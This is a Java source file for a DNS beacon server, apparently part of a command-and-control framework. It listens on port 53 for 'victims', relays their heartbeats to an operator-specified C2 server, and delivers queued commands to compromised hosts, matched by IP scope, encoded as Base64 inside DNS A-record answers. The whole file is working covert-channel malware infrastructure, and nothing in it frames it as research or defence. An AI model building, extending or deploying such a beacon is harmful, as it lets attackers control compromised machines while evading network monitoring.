package Servers.DnsBeacon;

import java.util.Scanner;
import java.io.Console;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.security.MessageDigest;
import java.nio.charset.StandardCharsets;

import org.json.JSONObject;

public class DnsBeaconServer implements Runnable{
    // Pointer to the Thread responsible for interacting with the C2 Server
    private DnsBeaconC2Handler C2Handler;

    // Boolean to determine if server should remain running
    private boolean sentinel = true;

    // Objects used to determine whether or not the server is still deploying
    private boolean settingUp;
    private Object settingUpLock;

    private HashMap<String, ArrayList<String>> clientCommandsToRun;

    /**
     * This Creates a new Beacon Server. The Server will listen for new victims, and communicate 
     * back to the C2 Server.
     * 
     * @param C2ServerIPAddress IP Address of the C2 Server
     * @param passwordDigest SHA-256 Digest of the Password entered by the user setting up this Beacon
     * @throws IOException
     */
    public DnsBeaconServer(String C2ServerIPAddress, String passwordDigest) throws IOException{
        this.settingUp = true;
        this.settingUpLock = new Object();

        this.C2Handler = new DnsBeaconC2Handler(this, C2ServerIPAddress, passwordDigest);
        this.clientCommandsToRun = new HashMap<>();
        this.settingUp = false;
        synchronized(settingUpLock){
            settingUpLock.notify();
        }
    }

    private class DnsBeaconServerClientHandler implements Runnable {
        DatagramPacket request;
        DatagramSocket socket;

        private DnsBeaconServerClientHandler(DatagramPacket request, DatagramSocket socket){
            this.request = request;
            this.socket = socket;
        }

        @Override
        public void run(){
            try {
                byte[] query = request.getData();
            int queryLen = request.getLength();

            String clientIP = getClientIPAddressFromDatagram(query, queryLen);
            int timeSinceLastCheckIn = getClientTimeSinceLastCheckIn(query);
            // String clientOS = getClientOS(query);

            sendHeartbeet(clientIP);

            String latestCommand = null;
            System.out.println("clients: " + clientCommandsToRun.keySet());

            if (clientCommandsToRun.keySet().contains(clientIP) && clientCommandsToRun.get(clientIP).size() > 0) {
                System.out.println("success");
                String temp;
                while (true) {
                    temp = clientCommandsToRun.get(clientIP).get(0);
                    System.out.println(temp);
                    JSONObject json = new JSONObject(temp);
                    System.out.println("time dif: " + ((double)(System.nanoTime() - (Long)json.get("tsReceived")) / 1000000000));
                    if ((double)(System.nanoTime() - (Long)json.get("tsReceived")) / 1000000000 < timeSinceLastCheckIn){
                        System.out.println("real success");
                        latestCommand = clientCommandsToRun.get(clientIP).remove(0);
                    } else {
                        clientCommandsToRun.get(clientIP).remove(0);
                    }
                    if (clientCommandsToRun.get(clientIP).isEmpty()){
                        break;
                    }
                }
            } else {
                clientCommandsToRun.put(clientIP, new ArrayList<>());
            }
            
            String commandToSendBack = null;
            if (latestCommand != null){
                JSONObject finalJSONToSend = new JSONObject(latestCommand);
                finalJSONToSend.remove("tsReceived");
                finalJSONToSend.remove("verb");
                commandToSendBack = finalJSONToSend.toString();
            }

            byte[] response = buildDnsResponse(query, queryLen, commandToSendBack);
            DatagramPacket reply = new DatagramPacket(response, response.length, request.getAddress(), request.getPort());
            socket.send(reply);
            } catch (Exception e){
                e.printStackTrace();
            }
        }
    }

    private byte[] buildDnsResponse(byte[] query, int queryLen, String stringToSendBack) {
        ArrayList<Integer> numbersToSendBack = new ArrayList<>();
        if (stringToSendBack != null) {
            stringToSendBack = Base64.getEncoder().encodeToString(stringToSendBack.getBytes(StandardCharsets.UTF_8));
            
            // Convert each character in the string to its ASCII value
            for (char c : stringToSendBack.toCharArray()) {
                numbersToSendBack.add((int) c);
            }
        } else {
            numbersToSendBack.add(8);
            numbersToSendBack.add(8);
            numbersToSendBack.add(8);
            numbersToSendBack.add(8);
        }
       

        // Estimate response size: query + 16 bytes per A record
        byte[] response = new byte[queryLen + (numbersToSendBack.size() * 4)];

        // Transaction ID
        response[0] = query[0];
        response[1] = query[1];

        // Flags: standard response, recursion available
        response[2] = (byte) 0x81;
        response[3] = (byte) 0x80;

        // Questions: 1
        response[4] = 0x00;
        response[5] = 0x01;

        // Answer RRs: N
        response[6] = (byte) (((numbersToSendBack.size() / 4) >> 8) & 0xFF);
        response[7] = (byte) ((numbersToSendBack.size() / 4) & 0xFF);

        // Authority RRs: 0
        response[8] = 0x00;
        response[9] = 0x00;

        // Additional RRs: 0
        response[10] = 0x00;
        response[11] = 0x00;

        // Copy query section
        // Find the end of the question section
        int questionEnd = 12;
        while (query[questionEnd] != 0) {
            questionEnd += (query[questionEnd] & 0xFF) + 1;
        }
        questionEnd += 5; // +1 for null terminator, +4 for QTYPE and QCLASS

        System.arraycopy(query, 12, response, 12, questionEnd - 12);
        int offset = 12 + (questionEnd - 12);

        for (int i = 0; i < numbersToSendBack.size(); i += 4) {
            // Name: pointer to query name
            response[offset++] = (byte) 0xC0;
            response[offset++] = 0x0C;

            // Type: A
            response[offset++] = 0x00;
            response[offset++] = 0x01;

            // Class: IN
            response[offset++] = 0x00;
            response[offset++] = 0x01;

            // TTL: 60 seconds
            response[offset++] = 0x00;
            response[offset++] = 0x00;
            response[offset++] = 0x00;
            response[offset++] = 0x3C;

            // Data length: 4 bytes
            response[offset++] = 0x00;
            response[offset++] = 0x04;

            // IP address
            for (int j = 0; j < 4; j++) {
                response[offset++] = (byte) numbersToSendBack.get(i + j).intValue();
            }
        }

        return Arrays.copyOf(response, offset);
    }

    private String getClientIPAddressFromDatagram(byte[] query, int queryLen){
        int octetOne = ((int)query[queryLen - 4]);
        if (octetOne < 0) {
            octetOne += 256;
        }
        int octetTwo = ((int)query[queryLen - 3]);
        if (octetTwo < 0) {
            octetTwo += 256;
        }
        int octetThree = ((int)query[queryLen - 2]);
        if (octetThree < 0) {
            octetThree += 256;
        }
        int octetFour = ((int)query[queryLen - 1]);
        if (octetFour < 0) {
            octetFour += 256;
        }

        return octetOne + "." + octetTwo + "." + octetThree + "." + octetFour;
    }

    private int getClientTimeSinceLastCheckIn(byte[] query){
        return (int)query[1];
    }

    // private String getClientOS(byte[] query){
    //     if ((int)query[0] == 1) {
    //         return "linux";
    //     }
    //     return "windows";
    // }

    /**
     * This function is used to shut down the Beacon Server. 
     * The Beacon server will distribute this message accordingly, to ensure that all
     * connections are shut down gracefully
     * 
     * @param reason
     * @throws IOException
     */
    protected void quit(String reason) throws IOException{
        // if quit gets called before the constructor is done setting up the server, then wait untill the server is done setting up
        if(settingUp){
            synchronized(settingUpLock){
                try {
                    settingUpLock.wait();
                } catch (InterruptedException e){
                    e.printStackTrace();
                }
            }
        }
        sentinel = false;
        System.out.println("Beacon Server is shutting down. Reason: " + reason);
    }

    private ArrayList<String> getIPMatches(String scope){
        String[] scopeOctets = scope.split("\\.");
        ArrayList<String> matchedClients = new ArrayList<>();

        for (String IPAddress : clientCommandsToRun.keySet()) {
            String[] clientOctets = IPAddress.split("\\.");
            if ((scopeOctets[0].equals(clientOctets[0]) || scopeOctets[0].equals("x")) &&
            (scopeOctets[1].equals(clientOctets[1]) || scopeOctets[1].equals("x")) &&
            (scopeOctets[2].equals(clientOctets[2]) || scopeOctets[2].equals("x")) &&
            (scopeOctets[3].equals(clientOctets[3]) || scopeOctets[3].equals("x"))) {
                matchedClients.add(IPAddress);
            }
        }
        
        return matchedClients;
    }

    /**
     * Distribute commands from the Beacon C2 Handler, to all of the different Beacon Client Handlers.
     * 
     * @param data - Data that contains, scope, verb, and command to be run
     */
    protected void distributeCommands(String data){
        JSONObject commandJSON = new JSONObject(data);
        commandJSON.put("tsReceived", System.nanoTime());
        String scope = commandJSON.get("scope").toString();
        for (String targetClient : getIPMatches(scope)){
            clientCommandsToRun.get(targetClient).add(commandJSON.toString());
        }
    }

    /**
     * This Function is used by the client handler to inform the C2 Server that it has lost a client
     * @param data
     */
    protected void sendDataToC2Server(String data){
        C2Handler.sendDataToC2Server(data);
    }

    protected void sendHeartbeet(String ip){
        JSONObject json = new JSONObject();
        json.put("ip", ip);
        json.put("type", "dnsheartbeat");
        json.put("data", "dnsheartbeat");
        C2Handler.sendDataToC2Server(json.toString());
    }

    @Override
    public void run(){
        Thread C2HandlerThread = new Thread(C2Handler);
        C2HandlerThread.start();
        try{
            DatagramSocket socket = new DatagramSocket(53);
            while (sentinel) {
                try {
                    byte[] buffer = new byte[512];
                    DatagramPacket request = new DatagramPacket(buffer, buffer.length);
                    socket.receive(request);

                    DnsBeaconServerClientHandler clientResponseHandler = new DnsBeaconServerClientHandler(request, socket);
                    Thread clientResponseHandlerThread = new Thread(clientResponseHandler);
                    clientResponseHandlerThread.start();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            socket.close();
        } catch (SocketException e){
            e.printStackTrace();
        }
    }

    public static void main(String[] args){
        // Have the user enter in the IP Address to connect to
        Scanner userScanner = new Scanner(System.in);
        System.out.print("Enter C2 Server IP Address: ");
        String C2ServerIPAddress = userScanner.next();

        // Have the user enter in the password (Console is used so that the input is masked)
        Console passwordInputConsole = System.console();
        String password = new String(passwordInputConsole.readPassword("Enter Password: "));

        // Hash the Password
        String passwordDigest = "";
        try{
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] encodedhash = digest.digest(password.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
            for (int i = 0; i < encodedhash.length; i++) {
                String hex = Integer.toHexString(0xff & encodedhash[i]);
                if(hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            passwordDigest = hexString.toString();
        } catch(Exception e){
            e.printStackTrace();
        }
        
        try{
            DnsBeaconServer beaconServer = new DnsBeaconServer(C2ServerIPAddress, passwordDigest);
            Thread beaconServerThread = new Thread(beaconServer);
            beaconServerThread.start();
        } catch(IOException e){
            e.printStackTrace();
        }
        
        userScanner.close();
    }
}
